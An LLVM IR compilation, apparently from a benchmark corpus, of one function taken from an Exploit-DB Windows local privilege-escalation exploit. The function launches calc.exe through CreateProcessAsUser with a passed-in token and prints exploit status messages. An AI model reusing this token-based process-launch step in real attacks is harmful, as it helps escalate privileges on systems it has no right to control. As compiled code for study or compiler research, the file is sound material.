; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_45496.c_AddAccountToAdminGroup.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_45496.c_AddAccountToAdminGroup.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_6__ = type { i32 }

@.str = private unnamed_addr constant [45 x i8] c"\0A[-] Failed to obtain current username: %d\0A\0A\00", align 1
@.str.1 = private unnamed_addr constant [29 x i8] c"\0A[*] Creating new process...\00", align 1
@.str.2 = private unnamed_addr constant [9 x i8] c"calc.exe\00", align 1
@FALSE = common dso_local global i32 0, align 4
@CREATE_NEW_CONSOLE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [56 x i8] c"\0A[-] Failed to execute command (%d) Run exploit again\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [36 x i8] c"\0A[+] Executed command successfully\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @AddAccountToAdminGroup(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.TYPE_6__, align 4
  %5 = alloca %struct.TYPE_6__, align 4
  %6 = alloca i32, align 4
  %7 = alloca [100 x i8], align 16
  %8 = alloca [15000 x i8], align 16
  store i32 %0, i32* %3, align 4
  %9 = call i32 @ZeroMemory(%struct.TYPE_6__* %4, i32 4)
  %10 = call i32 @ZeroMemory(%struct.TYPE_6__* %5, i32 4)
  %11 = getelementptr inbounds %struct.TYPE_6__, %struct.TYPE_6__* %4, i32 0, i32 0
  store i32 4, i32* %11, align 4
  store i32 100, i32* %6, align 4
  %12 = getelementptr inbounds [100 x i8], [100 x i8]* %7, i64 0, i64 0
  %13 = call i32 @GetUserName(i8* %12, i32* %6)
  %14 = icmp ne i32 %13, 0
  br i1 %14, label %18, label %15

15:                                               ; preds = %1
  %16 = call i32 (...) @GetLastError()
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0), i32 %16)
  store i32 -1, i32* %2, align 4
  br label %33

18:                                               ; preds = %1
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  %20 = getelementptr inbounds [15000 x i8], [15000 x i8]* %8, i64 0, i64 0
  %21 = call i32 @sprintf(i8* %20, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.2, i64 0, i64 0))
  %22 = load i32, i32* %3, align 4
  %23 = getelementptr inbounds [15000 x i8], [15000 x i8]* %8, i64 0, i64 0
  %24 = load i32, i32* @FALSE, align 4
  %25 = load i32, i32* @CREATE_NEW_CONSOLE, align 4
  %26 = call i32 @CreateProcessAsUser(i32 %22, i32* null, i8* %23, i32* null, i32* null, i32 %24, i32 %25, i32* null, i32* null, %struct.TYPE_6__* %4, %struct.TYPE_6__* %5)
  %27 = icmp ne i32 %26, 0
  br i1 %27, label %31, label %28

28:                                               ; preds = %18
  %29 = call i32 (...) @GetLastError()
  %30 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([56 x i8], [56 x i8]* @.str.3, i64 0, i64 0), i32 %29)
  store i32 -1, i32* %2, align 4
  br label %33

31:                                               ; preds = %18
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %33

33:                                               ; preds = %31, %28, %15
  %34 = load i32, i32* %2, align 4
  ret i32 %34
}

declare dso_local i32 @ZeroMemory(%struct.TYPE_6__*, i32) #1

declare dso_local i32 @GetUserName(i8*, i32*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i32 @sprintf(i8*, i8*) #1

declare dso_local i32 @CreateProcessAsUser(i32, i32*, i8*, i32*, i32*, i32, i32, i32*, i32*, %struct.TYPE_6__*, %struct.TYPE_6__*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
